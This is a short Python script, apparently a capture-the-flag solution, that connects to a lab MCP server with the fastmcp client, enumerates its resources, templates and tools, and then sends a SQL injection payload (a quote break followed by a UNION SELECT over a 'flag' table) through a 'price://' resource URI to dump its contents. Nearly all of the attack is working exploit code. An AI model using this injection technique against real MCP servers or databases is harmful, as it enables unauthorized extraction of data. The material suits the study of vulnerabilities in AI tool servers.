import asyncio
import os
from fastmcp import Client, FastMCP
from pprint import pprint
from urllib.parse import quote

def encode_query(query: str, *, safe: str = "") -> str:
    return quote(query, safe=safe)


# Set to your spawned lab instance, e.g. MCP_URL=http://INSTANCE_IP:PORT/mcp/
client = Client(os.environ.get("MCP_URL", "http://INSTANCE_IP:PORT/mcp/"))

async def main():
    async with client:
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("Resources")
        for r in resources:
            print('***')
            print(f"URI: {r.uri}")
            print(f"Name: {r.name}")
            print(f"Description: {r.description.strip()}")

        print("-"*50)
        print("Resource Templates:")
        for resource_template in resource_templates:
            print('***')
            print(resource_template.uriTemplate)
            print(resource_template.description.strip())
            

        print("-"*50)
        print("Tools:")
        for tool in tools:
            print('***')
            params = list(tool.inputSchema.get('properties').keys())
            print(f"{tool.name}({','.join(params)})")
            print(tool.description.strip())

        
        query = "UNION SELECT group_concat(id || ':' || flag) FROM flag"
        enc_query = encode_query(query+"--")
        res = None
        try:
            res = await client.read_resource(f"price://sdf'%20{enc_query}")
        except Exception as e:
            print(e)
        
        if res is not None:
            pprint(res)

        


asyncio.run(main())